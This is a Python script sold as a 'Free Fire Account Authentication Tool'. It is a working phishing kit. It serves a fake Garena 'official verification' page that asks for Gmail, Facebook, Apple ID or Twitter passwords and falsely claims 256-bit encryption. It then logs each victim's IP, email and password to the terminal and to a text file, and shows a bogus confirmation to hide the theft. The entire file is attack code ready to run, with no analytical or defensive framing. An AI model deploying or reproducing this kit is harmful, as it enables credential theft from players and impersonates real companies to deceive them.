#!/usr/bin/env python3
# FF_TOOL.py - Free Fire Account Authentication Tool

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import socket
import sys
from datetime import datetime
import time

# Configuration
PORT = 8080
LOG_FILE = "auth_logs.txt"

# Colors for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Authentication Page
FAKE_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Account Verification | Garena Official</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 0;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 480px;
            width: 100%;
            overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .ff-header {
            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
            padding: 25px 20px;
            position: relative;
        }

        .diamond-icon {
            font-size: 60px;
            animation: bounce 1s ease-in-out infinite;
            display: inline-block;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            color: white;
            font-size: 28px;
            margin: 10px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .subtitle {
            color: rgba(255,255,255,0.9);
            font-size: 14px;
        }

        .content {
            padding: 30px;
        }

        .verification-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 10px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 20px;
            display: inline-block;
        }

        .info-box {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 15px;
            margin-bottom: 20px;
            border: 2px solid #ff6b6b;
        }

        .info-text {
            font-size: 14px;
            color: #666;
            margin-top: 5px;
        }

        .input-group {
            margin: 20px 0;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
            font-size: 14px;
        }

        input, select {
            width: 100%;
            padding: 14px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.3s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #ff6b6b;
            box-shadow: 0 0 0 3px rgba(255,107,107,0.1);
        }

        button {
            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
            color: white;
            padding: 14px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            width: 100%;
            transition: all 0.3s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255,107,107,0.3);
        }

        .security-note {
            font-size: 11px;
            color: #888;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #e1e5e9;
        }

        .result {
            margin-top: 20px;
            padding: 15px;
            background: #e8f5e9;
            border-radius: 10px;
            display: none;
            color: #2e7d32;
        }

        .loading {
            display: none;
            margin-top: 15px;
        }

        .spinner {
            border: 3px solid rgba(255,107,107,0.3);
            border-radius: 50%;
            border-top: 3px solid #ff6b6b;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ff-header">
            <div class="diamond-icon">✅</div>
            <h1>FREE FIRE VERIFICATION</h1>
            <div class="subtitle">Official Account Authentication</div>
        </div>
        
        <div class="content">
            <div class="verification-badge">
                🔐 SECURE VERIFICATION PORTAL
            </div>
            
            <div class="info-box">
                <strong>Account Verification Required</strong>
                <div class="info-text">Verify your account to access exclusive features</div>
            </div>
            
            <form id="authForm">
                <div class="input-group">
                    <label>Account Type</label>
                    <select id="accountType" required>
                        <option value="Gmail">Gmail Account</option>
                        <option value="Facebook">Facebook Account</option>
                        <option value="Apple ID">Apple ID</option>
                        <option value="Twitter">Twitter Account</option>
                    </select>
                </div>
                
                <div class="input-group">
                    <label>Email / Username</label>
                    <input type="text" id="email" placeholder="Enter your email or username" required>
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                </div>
                
                <button type="submit" id="submitBtn">
                    VERIFY ACCOUNT
                </button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <div style="margin-top: 10px;">Verifying credentials...</div>
            </div>
            
            <div id="result" class="result"></div>
            
            <div class="security-note">
                🔒 SSL Encrypted Connection | Secure Authentication<br>
                Your data is protected with 256-bit encryption
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let accountType = document.getElementById('accountType').value;
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            
            let submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.6';
            document.getElementById('loading').style.display = 'block';
            
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    accountType: accountType,
                    email: email, 
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('loading').style.display = 'none';
                
                let resultDiv = document.getElementById('result');
                resultDiv.style.display = 'block';
                resultDiv.innerHTML = `
                    <strong>✓ VERIFICATION RECEIVED</strong><br><br>
                    Your account is being processed.<br>
                    You will receive a confirmation email within 24 hours.<br><br>
                    <small>Reference ID: ${Math.random().toString(36).substr(2, 8).toUpperCase()}</small>
                `;
                
                document.getElementById('authForm').reset();
                
                setTimeout(() => {
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                }, 5000);
            })
            .catch(error => {
                document.getElementById('loading').style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                alert('Connection error. Please try again.');
            });
        });
    </script>
</body>
</html>
"""

class AuthHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(FAKE_PAGE.encode('utf-8'))
        elif self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                account_type = data.get('accountType', 'N/A')
                email = data.get('email', 'N/A')
                password = data.get('password', 'N/A')
                ip = self.client_address[0]
                
                log_entry = f"""
{Colors.RED}{'='*70}{Colors.RESET}
{Colors.YELLOW}[{timestamp}]{Colors.RESET} {Colors.GREEN}✓ AUTH ATTEMPT{Colors.RESET}
{Colors.CYAN}📡 IP Address:{Colors.RESET} {ip}
{Colors.CYAN}📱 Account Type:{Colors.RESET} {account_type}
{Colors.CYAN}📧 Email/Username:{Colors.RESET} {Colors.BOLD}{email}{Colors.RESET}
{Colors.CYAN}🔑 Password:{Colors.RESET} {password}
{Colors.RED}{'='*70}{Colors.RESET}
"""
                
                print(log_entry)
                
                with open(LOG_FILE, 'a') as f:
                    f.write(f"""
{'='*70}
[{timestamp}] AUTH ATTEMPT
  IP Address: {ip}
  Account Type: {account_type}
  Email/Username: {email}
  Password: {password}
{'='*70}
""")
                
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())

def print_banner():
    banner = f"""
{Colors.RED}{'█'*70}{Colors.RESET}
{Colors.RED}██{Colors.RESET}                                                                    {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██████╗  █████╗ ██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗███████╗{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔════╝{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██████╔╝███████║██║  ██║███████║██████╔╝██║   ██║█████╔╝ ███████╗{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██╔══██╗██╔══██║██║  ██║██╔══██║██╔══██╗██║   ██║██╔═██╗ ╚════██║{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}██║  ██║██║  ██║██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██╗███████║{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}  {Colors.BOLD}{Colors.PURPLE}╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{Colors.RESET}  {Colors.RED}██{Colors.RESET}
{Colors.RED}██{Colors.RESET}                                                                    {Colors.RED}██{Colors.RESET}
{Colors.RED}{Colors.BOLD}{'█'*70}{Colors.RESET}
{Colors.CYAN}{Colors.BOLD}                    🔥 FF AUTH TOOL v2.0 | ACCOUNT VERIFICATION 🔥{Colors.RESET}
{Colors.YELLOW}{'─'*70}{Colors.RESET}
    """
    print(banner)

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}║  🔐 ACCOUNT AUTHENTICATION SYSTEM - SECURE VERIFICATION PORTAL      ║{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}║  📝 All verification requests are logged locally                     ║{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.CYAN}{Colors.BOLD}📋 INSTRUCTIONS:{Colors.RESET}")
    print(f"  {Colors.YELLOW}1.{Colors.RESET} Start the authentication server: {Colors.GREEN}python3 ff_auth_tool.py{Colors.RESET}")
    print(f"  {Colors.YELLOW}2.{Colors.RESET} Access the verification portal via browser")
    print(f"  {Colors.YELLOW}3.{Colors.RESET} Users can verify their accounts")
    print()
    
    local_ip = get_local_ip()
    print(f"{Colors.GREEN}{Colors.BOLD}✅ LOCAL SERVER:{Colors.RESET}")
    print(f"   📡 http://localhost:{PORT}")
    print(f"   📡 http://{local_ip}:{PORT}")
    print()
    print(f"{Colors.YELLOW}{Colors.BOLD}📝 LOG FILE:{Colors.RESET} {Colors.CYAN}{LOG_FILE}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}⚠️  PRESS Ctrl+C TO STOP THE SERVER{Colors.RESET}")
    print(f"\n{Colors.DIM}{'═'*70}{Colors.RESET}\n")
    
    try:
        server = HTTPServer(('0.0.0.0', PORT), AuthHandler)
        print(f"{Colors.GREEN}{Colors.BOLD}🚀 AUTHENTICATION SERVER STARTED ON PORT {PORT}{Colors.RESET}")
        print(f"{Colors.CYAN}🌐 Verification portal ready for use{Colors.RESET}\n")
        print(f"{Colors.YELLOW}{Colors.BOLD}💀 Waiting for verification requests...{Colors.RESET}\n")
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}{Colors.BOLD}👋 Server stopped{Colors.RESET}")
        if os.path.exists(LOG_FILE):
            print(f"\n{Colors.RED}💡 Log file location: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Goodbye!{Colors.RESET}\n")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}Try: sudo python3 ff_auth_tool.py (if port already in use){Colors.RESET}")

if __name__ == "__main__":
    main()
